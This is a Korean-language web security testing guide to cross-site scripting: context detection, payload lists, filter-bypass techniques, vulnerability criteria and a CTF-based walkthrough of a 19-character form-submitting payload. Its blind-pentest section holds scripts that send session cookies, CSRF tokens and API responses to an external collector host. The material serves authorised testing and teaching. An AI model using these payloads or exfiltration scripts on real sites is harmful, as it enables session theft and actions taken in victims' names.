---
sidebar_position: 19
title: XSS
description: 웹 진단 - Cross-Site Scripting (XSS) 컨텍스트 판단, 페이로드, 우회 노트
keywords: [XSS, Cross-Site Scripting, Reflected, Stored, DOM-based, 입력값 검증, OWASP A05, 길이 제한, iframe, named access, JavaScript Injection]
draft: false
toc_max_heading_level: 3
---

## 점검 목적

사용자 입력값이 HTML, Attribute, JavaScript, URL, DOM sink에 안전하게 인코딩되지 않은 채 들어가는지 확인. 성공 시 같은 origin 권한으로 **페이지 변조, 피싱, 권한 있는 API 호출, 세션 정보 노출**이 가능함.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **Reflected XSS** | 요청 파라미터가 즉시 응답에 반사 | 링크 전달 가능성, 로그인 필요 여부, 클릭 필요 여부 확인 |
| **Stored XSS** | 서버 DB/파일에 저장된 뒤 다른 화면에서 실행 | 관리자/상담원/타 사용자 화면에서 실행되면 우선순위 높음 |
| **DOM-based XSS** | 서버 응답보다 프론트 JS가 `location`, `postMessage`, storage 값을 위험 sink에 넣음 | Raw response와 실제 DOM을 따로 확인 |

---

## 진단 절차

#### Step 1. 진입점 식별

사용자 입력이 들어가거나 화면에 다시 출력될 수 있는 곳을 먼저 잡는다.

- URL 파라미터: `?q=...`, `?search=...`, `?next=...`
- POST/JSON Body: 검색, 댓글, 문의, 게시글, 프로필, 설정값
- HTTP Header: `User-Agent`, `Referer`, 커스텀 헤더
- URL Path: `/user/<name>`, `/category/<keyword>`
- URL Fragment: `#...` DOM-based 후보
- 파일명/메타데이터: 업로드 파일명, SVG, 이미지 미리보기, 첨부 목록

#### Step 2. XSS 진단 루틴

Burp Repeater에서 **고유 마커 + 특수문자 + 최소 실행 후보**를 한 번에 넣고, Raw response / Rendered DOM / Console을 같이 본다. 반영 여부, 인코딩, 필터, 컨텍스트를 분리해서 보지 말고 한 번에 판별한다.

**1. 문자/컨텍스트 맵핑**

```text
xssprobe_9f3'"><>()[]{};:/\`=javascript:confirm(9){{7*7}}${7*7}
```

**2. 태그/이벤트 필터 확인**

```html
xssprobe_9f3'"><svg/onload=confirm(9)><img/src=x onerror=confirm(9)>
```

**3. 컨텍스트 탈출 Polyglot**

```html
xss'"></script></textarea></title></style></xmp><svg/onload=confirm(document.domain)>
```

| 관찰 결과 | 바로 판단 | 다음 행동 |
| :--- | :--- | :--- |
| 마커가 응답에 없음 | 서버 미반영 또는 다른 저장/렌더링 경로 | 목록/상세/관리자 화면, DOM-only 여부 확인 |
| `<`, `>`, `"`, `'`가 entity 처리 | HTML/Attribute XSS 가능성 낮음 | JS string, URL, DOM sink로 전환 |
| `<script>`만 제거 | 태그 블랙리스트 가능성 | `svg`, `img`, `details`, `iframe srcdoc` 확인 |
| 이벤트 핸들러만 제거 | `onload`, `onerror` 중심 필터 가능성 | `onfocus`, `ontoggle`, `onanimationstart`, SVG `onbegin` 확인 |
| 공백/슬래시가 변형 | 단순 정규식 필터 가능성 | `<svg/onload=...>`, `%09`, `%0a`, unquoted attribute 확인 |
| Raw는 안전한데 DOM에서 태그 생성 | 프론트 렌더링 변형 또는 DOM XSS | Elements/Console 기준으로 재판정 |
| CSP violation 발생 | sink는 있으나 실행 차단 | CSP 정책은 `security-headers.md`와 같이 확인 |

#### Step 3. 컨텍스트별 빠른 선택

마커가 반영된 위치를 보고 아래에서 바로 골라 넣는다. XSS는 “센 payload”보다 **컨텍스트에 맞는 탈출 문자**가 먼저다.

| 반영 위치 | 먼저 넣을 payload | 볼 것 |
| :--- | :--- | :--- |
| HTML body: `<div>HERE</div>` | `<svg/onload=confirm(document.domain)>` | 태그가 DOM에 생성되는지 |
| Attribute: `<input value="HERE">` | `" autofocus onfocus=confirm(document.domain) x="` | 속성 탈출 후 이벤트가 붙는지 |
| Attribute: `<input value='HERE'>` | `' autofocus onfocus=confirm(document.domain) x='` | 작은따옴표 탈출 가능 여부 |
| JS string: `var x = "HERE"` | `";confirm(document.domain);//` | 문자열 탈출 후 JS 구문 실행 여부 |
| Script block 내부 | `</script><svg/onload=confirm(document.domain)>` | script 종료 후 HTML 파싱 여부 |
| URL/href | `javascript:confirm(document.domain)` | 실제 clickable/navigable sink인지 |
| JSON 응답 | `<img/src=x onerror=confirm(document.domain)>` | 프론트가 `.html()`, `innerHTML`로 렌더링하는지 |
| DOM source | `#<img/src=x onerror=confirm(document.domain)>` | Raw response가 아니라 실제 DOM 기준으로 확인 |

#### Step 4. Stored / DOM / 영향 확인

- Stored XSS는 저장 요청만 보지 말고 **목록 / 상세 / 관리자 / 알림 / 엑셀/HTML 미리보기**까지 따라간다.
- DOM XSS는 Burp response보다 브라우저 Elements, Sources, Console을 우선한다.
- 영향 입증은 단순 팝업보다 **피해자 권한으로 같은 origin 동작이 가능한지**를 보여주는 게 좋다.
- `document.cookie`는 HttpOnly 여부 확인용으로만 보고, 실제 외부 전송은 사전 협의된 수신 서버에서만 수행한다.

---

## 페이로드 노트

평소에는 `Step 2`와 `Step 3`만으로 대부분 갈린다. 아래는 컨텍스트가 확정됐거나 필터가 보일 때 바로 가져다 쓰는 payload 모음이다.

### 1. HTML body 컨텍스트

입력값이 태그 밖 텍스트 영역에 그대로 출력될 때 사용한다.

```html
<script>confirm(document.domain)</script>
<svg/onload=confirm(document.domain)>
<img/src=x onerror=confirm(document.domain)>
<details open ontoggle=confirm(document.domain)>
<iframe srcdoc="<svg onload=confirm(document.domain)>"></iframe>
```

`<script>`가 막혀도 `svg`, `img`, `details`, `iframe srcdoc` 같은 대체 태그가 살아남는지 본다.

### 2. Attribute 컨텍스트

입력값이 `<input value="HERE">`, `<a title="HERE">` 같은 속성값에 들어갈 때 사용한다.

```html
" onmouseover="confirm(document.domain)
" autofocus onfocus="confirm(document.domain)
" autofocus onfocus=confirm(document.domain) x="
' autofocus onfocus=confirm(document.domain) x='
" onmouseover=confirm(document.domain) x="
```

생성 예시는 아래처럼 속성을 닫고 새 이벤트 핸들러가 붙는 형태다.

```html
<input value="" autofocus onfocus=confirm(document.domain) x="">
```

사용자 interaction이 필요한 `onmouseover`보다 `autofocus onfocus`가 먼저 먹히는지 확인한다.

### 3. JavaScript 문자열 / script block

입력값이 JS 변수, 문자열, template literal, `<script>` 내부에 들어갈 때 사용한다.

```javascript
';confirm(document.domain);//
";confirm(document.domain);//
\';confirm(document.domain);//
\");confirm(document.domain);//
</script><svg/onload=confirm(document.domain)>
${confirm(document.domain)}
`-confirm(document.domain)-`
```

quote가 백슬래시로 escape되는 환경은 `\';...//`처럼 escape 문자를 다시 깨는지 본다.

### 4. URL / href / redirect 컨텍스트

입력값이 `<a href="HERE">`, redirect URL, link-like 필드에 들어갈 때 사용한다.

```html
javascript:confirm(document.domain)
JaVaScRiPt:confirm(document.domain)
java&#x73;cript:confirm(document.domain)
java&#115;cript:confirm(document.domain)
data:text/html,<svg onload=confirm(document.domain)>
```

문자열 저장만으로는 부족하다. 링크 클릭, 리다이렉트, `location.href` 할당처럼 실제 navigation sink인지 확인한다.

### 5. DOM-based XSS

서버 응답에는 payload가 없거나 안전해 보이는데 프론트 JS가 URL/DOM 값을 읽어 위험 sink에 넣는 경우다.

```text
https://<TARGET>/page#<img/src=x onerror=confirm(document.domain)>
https://<TARGET>/page?next=javascript:confirm(document.domain)
https://<TARGET>/page?msg='"><svg/onload=confirm(document.domain)>
```

확인할 source:

```text
location.href
location.search
location.hash
document.referrer
window.name
postMessage data
localStorage / sessionStorage
```

위험 sink:

```text
innerHTML / outerHTML / insertAdjacentHTML
document.write
eval / Function / setTimeout(string)
location / src / href 동적 할당
```

### 6. Stored XSS 확인 흐름

게시글, 댓글, 문의, 파일명, 프로필처럼 저장되는 입력값은 저장 위치와 실행 위치가 다를 수 있다.

```http
POST /api/inquiry/write HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=<USER_SESSION>

category=qna&title=<img/src=x onerror=confirm(document.domain)>&content=test
```

확인은 저장 요청이 아니라 조회 경로까지 이어서 한다.

```http
GET /api/inquiry/list HTTP/1.1
Host: <TARGET>

GET /api/inquiry/detail?id=<ID> HTTP/1.1
Host: <TARGET>
```

작성자 화면에서는 안 터져도 관리자/상담원/목록 페이지에서 실행되면 Stored XSS로 본다.

### 7. SVG / 파일명 / 업로드 기반 XSS

이미지 업로드, 파일 첨부, 파일 목록 출력에서 자주 본다.

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="confirm(document.domain)">
</svg>
```

파일명 기반:

```text
"><img src=x onerror=confirm(document.domain)>.jpg
<svg onload=confirm(document.domain)>.png
```

`<img src="uploaded.svg">`로는 브라우저 정책상 스크립트가 안 도는 경우가 있다. 직접 열기, `object/embed`, 관리자 렌더링, 미리보기 경로를 따로 본다.

### 8. 영향 입증 payload

쿠키 탈취보다 “같은 origin 권한으로 JS 실행”을 보여주는 쪽이 실무 보고에 더 안정적이다.

```html
<svg/onload=confirm(document.domain)>
```

```html
<script>
document.body.insertAdjacentHTML('afterbegin', '<h1>XSS Executed: ' + document.domain + '</h1>');
</script>
```

```html
<script>
fetch('/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(t => document.body.insertAdjacentHTML('beforeend', '<pre>' + t.replace(/[<>&]/g, '_') + '</pre>'));
</script>
```

관리자 화면에서 실행되거나 인증 API가 피해자 권한으로 호출되면 영향도가 올라간다.

---

## 우회 매트릭스

무작정 payload를 늘리지 말고, Burp response에서 **무엇이 제거됐는지** 보고 좁혀간다.

| 필터 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| `<script>` 제거 | script 대체 태그 | `<svg/onload=...>`, `<img/src=x onerror=...>` |
| 공백 제거 | slash, tab, newline, unquoted attribute | `<svg/onload=...>`, `%09`, `%0a` |
| quote 제거 | unquoted attribute, backtick | `<input autofocus onfocus=...>` |
| 괄호 제거 | tagged template | `` confirm`xss` `` |
| `alert` 차단 | 다른 실행 함수 | `confirm`, `prompt`, `print`, `top['alert'](1)` |
| `onload` / `onerror` 차단 | 다른 이벤트 | `onfocus`, `ontoggle`, `onanimationstart`, SVG `onbegin` |
| `javascript:` 차단 | 인코딩/대소문자 변형 | `JaVaScRiPt:`, `java&#x73;cript:` |
| `<`, `>` entity 처리 | 다른 컨텍스트로 전환 | JS string, URL, DOM sink |
| CSP inline 차단 | CSP 정책 검토 | nonce, allowlist, JSONP, `unsafe-inline` 여부 |

### 우회 payload 예시 모음

```html
<!-- script 대체 -->
<svg/onload=confirm(document.domain)>
<img/src=x onerror=confirm(document.domain)>
<details/open/ontoggle=confirm(document.domain)>

<!-- 이벤트 다양화 -->
<input autofocus onfocus=confirm(document.domain)>
<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=confirm(document.domain)>
<svg><animate attributeName=x onbegin=confirm(document.domain)></animate></svg>

<!-- 문자/키워드 우회 -->
<svg/onload=confirm`xss`>
<svg/onload=top['confirm'](document.domain)>
<a href=java&#x73;cript:confirm(document.domain)>click</a>
<a href=javascript:confirm(String.fromCharCode(88,83,83))>click</a>

<!-- 실제 진단 통과 사례 -->
<img src = “x” onerror=”\u0061lert(1)”>
<img src="x" onerror="\u0061lert(this['ownerDoc'+'ument']['coo'+'kie'])">
<x-script><!--alert(‘XSS 취약점 존재 !’)//-></x-script>
```

---

## 취약 판정 기준

다음 중 하나라도 해당하면 취약으로 본다.

- [ ] 페이로드가 응답 HTML/JS에 무인코딩으로 포함되어 브라우저에서 JavaScript가 실행됨
- [ ] `document.domain`, `print()`, DOM 변조 등으로 같은 origin에서 스크립트 실행이 확인됨
- [ ] Stored 형태로 저장되어 다른 세션/권한 화면에서도 실행됨
- [ ] JSON/API 응답 자체는 문자열이지만 프론트 렌더링 과정에서 DOM에 태그/이벤트가 생성됨

다음은 취약 아님 또는 저영향으로 분리한다.

- [ ] `<`, `>`, `"`, `'`가 모두 HTML entity로 인코딩되어 실행 컨텍스트를 만들 수 없음
- [ ] CSP로 인라인 실행이 차단되고, 우회 가능한 sink/allowlist가 확인되지 않음
- [ ] Self-XSS로 본인만 트리거 가능하며 외부 전달 경로가 없음

---

## 블라인드 모의해킹 확장

취약점 진단에서는 JavaScript 실행 확인으로 멈추지만, 블라인드 모의해킹에서는 **피해자 권한으로 어디까지 동작 가능한지**를 확인한다.

| 단계 | 확인할 것 | 증거 기준 |
| :--- | :--- | :--- |
| 1. 실행 주체 | 어느 계정/권한 화면에서 실행되는지 | `document.domain`, 현재 path, 사용자 식별 API |
| 2. 세션/토큰 접근 | JS에서 읽히는 쿠키, storage, CSRF token | 승인된 collector 수신 로그 |
| 3. 권한 API 접근 | 피해자 세션으로 내부 API 호출 가능 여부 | `/api/me`, 관리자 API 응답 샘플 |
| 4. 액션 수행 | 피해자 권한으로 상태 변경 요청이 가능한지 | 테스트 데이터 또는 영향 낮은 액션 성공 |

### 권한 API 확인

팝업만으로 끝내지 말고 같은 origin에서 인증 API가 호출되는지 본다. 응답 일부를 collector로 전송해 피해자 권한 API 접근을 입증한다.

```html
<script>
fetch('/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => {
    const sample = t.slice(0, 800);
    navigator.sendBeacon('https://<APPROVED-COLLECTOR>/xss-api',
      JSON.stringify({caseId: 'xss-001', path: location.pathname, sample}));
  });
</script>
```

API 경로는 서비스 구조에 맞춰 `/api/me`, `/api/profile`, `/api/session`, `/api/user/info`처럼 자기 정보 조회 API를 우선한다. 관리자 화면 Stored XSS라면 관리자 전용 API 호출, 권한 화면 접근, 중요 기능 호출 가능성을 단계적으로 확인한다.

### 세션 / 토큰 영향 확인

JS에서 접근 가능한 값은 전체 덤프보다 필요한 키만 최소로 확인한다. HttpOnly가 아닌 쿠키, CSRF token, 화면에 노출된 사용자 식별값처럼 영향 판단에 필요한 값만 승인된 collector로 보낸다.

```html
<script>
const token = document.querySelector('input[name=csrf], meta[name=csrf-token]')?.value
  || document.querySelector('meta[name=csrf-token]')?.content
  || '';
const selectedCookie = document.cookie
  .split('; ')
  .filter(v => /csrf|xsrf|session/i.test(v.split('=')[0]))
  .join('; ');
navigator.sendBeacon('https://<APPROVED-COLLECTOR>/xss-cred',
  JSON.stringify({
    caseId: 'xss-001',
    path: location.pathname,
    readableCookie: selectedCookie,
    csrf: token,
    user: document.querySelector('[data-user-id]')?.getAttribute('data-user-id') || ''
  }));
</script>
```

HttpOnly 쿠키는 JS로 읽히지 않지만, 같은 origin API 호출에는 자동 포함된다. 따라서 쿠키 원문 수집 실패가 영향 없음은 아니다.

### 액션 가능성 확인

권한 있는 API 호출이 가능하면 비파괴 요청부터 본다.

```javascript
fetch('/api/notifications?limit=1', {credentials: 'include'})
  .then(r => r.text())
  .then(t => console.log(t.slice(0, 300)));
```

상태 변경은 테스트 데이터가 있으면 우선 사용하고, 필요하면 영향이 낮고 되돌릴 수 있는 실데이터 액션까지 확인한다.

---

## 심화 사례: 길이 제한 XSS와 폼 활용

앞의 페이로드 노트 `3. JavaScript 문자열 / script block` 컨텍스트에서 이어지는 심화 사례다. 입력 길이가 짧게 제한된 필드에서도 JavaScript 문자열을 탈출해 동작을 일으킬 수 있는 조건을, 폼·iframe·Window 이름 접근과 함께 단계별로 분해한다.

### 이 사례에서 배울 것

사용자 이름은 20자까지만 입력할 수 있다. 그런데 그 이름이 웹 페이지의 JavaScript 코드 안에 그대로 들어간다면, 짧은 입력만으로도 브라우저에 동작을 시킬 수 있다.

이 문서에서 살펴볼 입력은 다음과 같다.

```javascript
");top.a.submit()//
```

이 코드는 19자다. 길이 검사를 통과하면서, 다른 곳에 준비된 폼을 제출하는 역할을 한다. **요청에 필요한 정보를 전부 19자에 집어넣은 것이 아니라, 그 정보를 HTML 폼에 두고 실행하는 부분만 짧게 만든 것이다.**

출발점은 [ENKI Jeopardy Write-up의 leakage 문제](https://www.enki.co.kr/media-center/blog/enki-redteam-ctf-jeopardy-writeup)다. 원문은 프로필의 JavaScript 삽입 지점과 메모의 HTML 삽입 지점을 연결한다. 여기서는 그 브라우저 동작을 분리해서 설명한다. 아래의 `/lesson/` 경로와 표시 이름 변경 폼은 이해를 위해 만든 예시이며, 원문 서비스의 실제 API가 아니다.

요청 위조의 기본 조건은 [CSRF 문서](./csrf.md)와 함께 읽는다.

### 1. console.log()에 이름을 출력하는데 왜 코드가 실행될까?

#### 정상적인 출력

서버가 사용자 이름을 넣어 다음 HTML을 만든다고 가정하자.

```html
<script>
console.log("민수");
</script>
```

브라우저가 JavaScript를 해석할 때, 따옴표 사이의 `민수`는 문자열이다. 따라서 콘솔에 이름만 출력한다.

문제는 서버가 **문자열 값에 필요한 처리를 하지 않고, 사용자 입력을 JavaScript 소스에 직접 이어 붙이는 경우**다. 생성 규칙을 단순하게 표현하면 다음과 같다.

```text
고정된 앞부분: console.log("
사용자가 정한 이름: 민수
고정된 뒷부분: ");
```

이 규칙은 사용자가 입력한 따옴표까지 JavaScript 구문의 일부로 만든다. `console.log()` 자체가 문자열을 실행하는 것은 아니다. 브라우저가 `console.log()`를 호출하기 전에, 서버가 만들어 보낸 코드 전체를 해석하는 과정에서 문제가 생긴다.

#### 입력을 넣은 뒤 만들어지는 코드

이름이 `");top.a.submit()//`이면 결과는 다음과 같다.

```javascript
console.log("");top.a.submit()//");
```

브라우저가 보는 구조를 나누면 다음과 같다.

| 조각 | 어디에서 왔는가 | 해석 결과 |
| :--- | :--- | :--- |
| `console.log("` | 서버의 고정 코드 | 함수 호출과 문자열 시작 |
| `"` | 사용자 입력 | 문자열 종료 |
| `);` | 사용자 입력 | 함수 호출 종료, 문장 구분 |
| `top.a.submit()` | 사용자 입력 | 별도의 JavaScript 동작 실행 |
| `//` | 사용자 입력 | 같은 줄의 나머지를 주석으로 처리 |
| `");` | 서버의 고정 코드 | 주석에 포함되어 구문으로 해석되지 않음 |

결과적으로 빈 문자열을 콘솔에 출력한 다음, 폼 제출 메서드를 호출한다.

#### 따옴표만 닫으면 충분하지 않은 이유

이 예시에서는 문자열이 함수의 괄호 안에 있다. 따라서 문자열을 닫는 `"`에 이어 함수 호출을 닫는 `)`도 필요하다.

입력이 들어가는 자리가 `const name = "...";`인 경우에는 주변 구문이 달라진다. **같은 입력을 어디에 넣어도 실행되는 것이 아니라, 원래 코드의 따옴표와 괄호 구조에 맞아야 한다.**

또한 `//`는 한 줄 주석이다. 뒤에 남는 코드가 다음 줄에 배치되면 이 설명대로 가려지지 않는다. 서버가 생성한 실제 응답에서 줄바꿈까지 확인해야 한다.

### 2. 20자 제한을 어떻게 다루는가?

문자 수를 세어보면 다음과 같다.

| 조각 | 문자 수 | 누적 |
| :--- | ---: | ---: |
| `");` | 3 | 3 |
| `top` | 3 | 6 |
| `.a` | 2 | 8 |
| `.submit()` | 9 | 17 |
| `//` | 2 | 19 |

`.submit()`은 점 1개, `submit` 6개, 괄호 2개로 9자다. 전체 입력의 길이는 아래 코드로도 확인할 수 있다.

```javascript
const payload = '");top.a.submit()//';
console.log(payload.length);
// 19
```

이 입력은 ASCII 문자로만 구성되어 있어 일반적인 문자 수와 UTF-8 바이트 수가 같다. URL 인코딩을 거친 전송 문자열의 길이는 달라질 수 있으므로, 서버가 디코딩 전후 중 언제 길이를 검사하는지도 구분한다.

여기서 중요한 점은 **20자 제한이 정상적으로 적용되어도 성립할 수 있다**는 것이다. 긴 요청 주소, HTTP 메서드, 변경할 필드와 값은 이름 필드에 넣지 않는다. 별도 HTML 폼에 준비해 둔다.

| 위치 | 담아두는 내용 |
| :--- | :--- |
| 길이가 제한된 이름 | 문자열에서 빠져나와 폼을 제출하는 짧은 코드 |
| 별도로 HTML을 넣을 수 있는 메모 | 폼의 목적지, 전송 방식, 필드 이름과 값 |

즉, 길이 제한의 구현 오류를 이용한 사례와 구분해야 한다. 이 사례에서 제한이 걸린 것은 한 입력 필드의 길이이며, 브라우저에서 참조할 수 있는 다른 HTML의 크기까지 제한한 것은 아니다.

### 3. 폼과 iframe은 어디에 있는가?

#### 바깥 페이지: 요청 정보를 가진 폼

같은 서비스의 메모 화면에 다음 HTML을 넣을 수 있다고 가정하자.

```html
<form id="a" action="/lesson/update-display-name" method="post">
  <input type="hidden" name="displayName" value="학습용 이름">
</form>

<iframe src="/lesson/profile"></iframe>
```

폼은 요청을 만들기 위한 정보다.

- `id="a"`: JavaScript에서 이 폼을 찾아갈 때 사용하는 식별자다.
- `action`: 폼 데이터를 보낼 URL이다. 이 상대 경로는 폼이 있는 문서의 기준 URL을 바탕으로 해석된다.
- `method="post"`: POST 방식으로 전송한다.
- `name="displayName"`: 서버에 전달할 필드 이름이다.
- `value`: 그 필드에 담을 값이다.
- `type="hidden"`: 화면에 입력 상자를 표시하지 않는다. 비밀로 보호하거나 사용자 수정을 막는 기능은 아니다.

폼이 HTML에 있다는 것만으로 바로 제출되지는 않는다. 제출을 시작하는 동작이 추가로 필요하다.

#### 안쪽 페이지: 짧은 코드가 실행되는 프로필

`iframe`은 현재 페이지 안에 다른 문서를 띄우는 요소다. 위 예시에서는 메모 안에서 프로필 페이지를 불러온다.

프로필 응답에 앞서 살펴본 코드가 들어 있다면, iframe의 JavaScript 실행 환경에서 다음 코드가 실행된다.

```javascript
console.log("");top.a.submit()//");
```

두 문서의 관계는 다음과 같다.

```text
최상위 문서: 메모 페이지
│
├─ form#a         요청 주소와 전송할 필드가 있음
│
└─ iframe: 프로필 페이지
   └─ 이름이 삽입된 JavaScript 실행
      └─ top.a.submit()으로 최상위 문서의 폼 제출
```

폼이 먼저 만들어지고 iframe이 그 뒤에 등장하도록 예시를 구성했다. 실제 페이지에서는 스크립트 실행 시점에 해당 폼이 DOM에 존재하는지 확인해야 한다.

### 4. top.a.submit()을 정확하게 읽기

#### top: 최상위 창

iframe 안의 `window`는 현재 iframe의 창이다. `parent`는 바로 위 부모 창이고, `top`은 가장 바깥의 최상위 창이다.

```text
페이지 A
└─ iframe B
   └─ iframe C

C에서 window → C
C에서 parent → B
C에서 top    → A
```

iframe이 한 단계인 예시에서는 `parent`와 `top`이 같은 창을 가리킨다. 여러 단계로 중첩되면 다르다. [MDN: Window.top](https://developer.mozilla.org/en-US/docs/Web/API/Window/top)

#### a: Window의 이름 기반 요소 접근

브라우저는 HTML 요소의 `id` 등을 통해 `window`에서 요소를 이름으로 접근할 수 있게 하는 기능을 제공한다. 이 예시에서는 최상위 문서의 `id="a"` 폼이 `top.a`로 참조되는 조건을 이용한다. [MDN: Window의 named properties](https://developer.mozilla.org/en-US/docs/Web/API/Window#named_properties)

이를 명시적인 요소 탐색으로 풀어 쓰면 의도는 다음과 같다.

```javascript
top.document.getElementById("a").submit();
```

짧은 표현은 문자 수를 줄여준다. 다만 두 표현이 모든 DOM에서 동일한 결과를 보장하지는 않는다. 이름이 중복되거나 같은 이름의 전역 속성 등이 있으면 `top.a`가 기대한 폼을 가리키지 않을 수 있다. 일반적인 서비스 코드를 작성할 때는 명시적으로 요소를 찾는 편이 이해하기 쉽다.

이름 접근 기능이 등장했다는 이유만으로 곧바로 DOM Clobbering이라고 분류하지는 않는다. 여기서는 폼을 짧게 참조하는 데 사용했다. 기존 코드가 의존하는 변수나 속성을 HTML 요소로 덮어써 흐름을 바꾸는지까지 보아야 별도의 DOM Clobbering 분석이 된다.

#### submit(): 폼을 제출하는 메서드

`submit()`은 폼에 적힌 `action`, `method`, 필드 정보를 바탕으로 제출을 수행한다. 서버 명령을 직접 실행하거나 브라우저의 권한을 관리자 권한으로 바꾸는 함수가 아니다.

또한 제출 버튼을 클릭하는 것과 완전히 같지 않다. 직접 호출하면 `submit` 이벤트와 브라우저의 폼 제약 검증이 실행되지 않는다. 따라서 `onsubmit`에서만 처리하는 검증은 이 호출을 막지 못한다. 서버의 검증은 별개로 계속 적용된다.

폼 안에 `name="submit"` 또는 `id="submit"`인 입력 요소가 있으면 메서드가 그 요소에 가려져 호출이 실패할 수도 있다. [MDN: HTMLFormElement.submit()](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/submit)

### 5. 다른 사이트의 폼도 마음대로 제출할 수 있을까?

`top`을 참조할 수 있다는 사실과, 그 문서의 폼에 접근할 수 있다는 사실은 다르다. 이 방식으로 다른 프레임의 DOM에 접근하려면 동일 출처 정책을 통과해야 한다.

출처는 기본적으로 **스킴, 호스트, 포트**의 조합이다.

| 바깥 페이지 | iframe 페이지 | 동일 출처인가? |
| :--- | :--- | :--- |
| `https://study.example/memo` | `https://study.example/profile` | 예: 경로만 다름 |
| `https://study.example/memo` | `http://study.example/profile` | 아니오: 스킴이 다름 |
| `https://study.example/memo` | `https://other.example/profile` | 아니오: 호스트가 다름 |
| `https://study.example:8443/memo` | `https://study.example/profile` | 아니오: 포트가 다름 |

따라서 외부 사이트에서 대상 프로필을 iframe으로 불러오기만 하면 `top.a`가 동작한다고 생각하면 안 된다. 이 예시에서 같은 서비스 안의 HTML 삽입 지점이 중요한 이유다.

CORS 응답 헤더를 허용해도 다른 출처 iframe의 DOM을 자유롭게 읽고 조작하게 되지는 않는다. CORS로 허용하는 응답 접근과 프레임 간 DOM 접근은 구분해야 한다. [MDN: 동일 출처 정책](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy)

### 6. XSS 실행과 서버의 실제 변경은 별개다

전체 흐름은 다음 순서로 이해한다.

1. 사용자가 메모 페이지를 연다.
2. 브라우저가 메모의 폼을 만들고 프로필 iframe을 불러온다.
3. 프로필의 이름이 JavaScript 구문으로 해석되어 실행된다.
4. iframe의 코드가 최상위 문서의 폼을 찾는다.
5. 폼 제출로 HTTP 요청이 발생한다.
6. 서버가 인증, CSRF 방어, 대상 데이터의 수정 권한 등을 검사한다.
7. 필요한 조건을 통과한 경우에만 데이터가 변경된다.

**5번까지 성공했다는 사실이 7번의 성공을 보장하지는 않는다.** 쿠키가 붙지 않았거나 필수 토큰이 없거나, 현재 사용자가 그 데이터를 변경할 권한이 없으면 서버에서 거절할 수 있다.

누구의 권한으로 요청되는지는 코드를 저장한 사람이 아니라 **그 페이지를 보고 있는 브라우저의 인증 상태**에 달려 있다. 관리자에게 페이지를 보게 하는 흐름이 별도로 있다면 관리자 세션이 영향을 줄 수 있지만, 위 문자열 자체에 관리자 권한을 만드는 기능은 없다.

분류할 때는 JavaScript 문자열에서 코드 실행으로 이어지는 부분을 XSS로, 폼으로 의도하지 않은 요청을 일으키는 부분을 요청 위조와 연결해 설명할 수 있다. 다만 여기의 예시는 같은 출처 XSS가 요청을 유발하므로, 외부 사이트의 폼만 이용하는 전형적인 CSRF와 동작 조건이 완전히 같지는 않다.

`HttpOnly`는 JavaScript의 쿠키 읽기를 제한한다. 그 쿠키가 브라우저 요청에 자동으로 포함되는 것까지 금지하지는 않는다. 쿠키를 읽지 않고도 사용자 권한으로 요청이 발생할 수 있다는 점을 구분한다.

### 7. 어떤 조건에서 실패하는가?

| 관찰되는 현상 | 먼저 확인할 조건 |
| :--- | :--- |
| 이름이 글자로만 보임 | JavaScript 소스에 들어가는지, 텍스트로 안전하게 출력되는지 |
| `SyntaxError` 발생 | 따옴표·괄호의 개수, 뒤에 남는 코드, 줄바꿈 위치 |
| 인라인 스크립트 실행이 차단됨 | 실제 CSP 정책이 해당 스크립트 실행을 허용하는지 |
| 프로필이 iframe에 나타나지 않음 | `frame-ancestors`, `X-Frame-Options`, 로그인 리다이렉트 |
| 프레임 접근 관련 오류 | 최종 로딩된 문서들의 출처, iframe의 `sandbox` 설정 |
| `a`가 없거나 예상과 다른 객체임 | 폼 생성 시점, 실제 `id`, 이름 충돌, 프레임 중첩 |
| `submit is not a function` | 참조한 객체가 폼인지, `submit`이라는 폼 컨트롤이 있는지 |
| 폼 제출이 브라우저에서 차단됨 | CSP의 `form-action` 등 제출 관련 제한 |
| 요청은 보이지만 서버에서 거절됨 | 인증정보, CSRF 토큰, 필드 검증, 객체별 수정 권한 |
| 응답이 200인데 값은 그대로임 | 성공 화면 대신 실제 변경 결과를 후속 조회했는지 |

각 정책의 존재만 보고 성공·실패를 단정하지 않는다. 예를 들어 `SAMEORIGIN` 프레임 정책은 같은 출처의 iframe을 허용할 수 있다. 반대로 같은 URL 구조라도 `sandbox`가 문서의 출처나 스크립트 실행을 제한하면 예시와 다르게 동작할 수 있다.

### 8. 네트워크 요청 없이 구문만 확인하기

아래 코드는 실제 DOM과 폼 대신 호출 횟수를 기록하는 객체를 넣는다. Node.js에서 실행하면 생성된 JavaScript가 구문 오류 없이 해석되고 `submit()` 자리에 둔 함수가 한 번 실행되는지 확인할 수 있다.

```javascript
const payload = '");top.a.submit()//';
const generatedCode = 'console.log("' + payload + '");';
let submitted = 0;

const mockTop = {
  a: {
    submit() {
      submitted += 1;
    },
  },
};

// 이 예제에 적힌 고정 문자열만 해석한다.
// 서비스의 사용자 입력을 이렇게 실행하는 코드를 작성하면 안 된다.
const run = new Function("top", "console", generatedCode);
run(mockTop, { log() {} });

console.log({ length: payload.length, generatedCode, submitted });
// length: 19
// generatedCode: console.log("");top.a.submit()//");
// submitted: 1
```

이 확인은 JavaScript 구문과 호출에 한정된다. 실제 브라우저의 이름 기반 요소 접근, 동일 출처 정책, 쿠키 전송, 서버의 상태 변경을 재현한 것은 아니다.

### 9. 방어를 어느 지점에 적용해야 할까?

가장 먼저 끊어야 할 연결은 **사용자 이름이 실행 가능한 JavaScript 소스가 되는 부분**이다. 사용자 입력을 인라인 스크립트에 직접 이어 붙이지 말고, 데이터로 전달받아 처리한다. 화면에 이름만 출력할 때는 `textContent`처럼 텍스트로 다루는 방식을 사용한다.

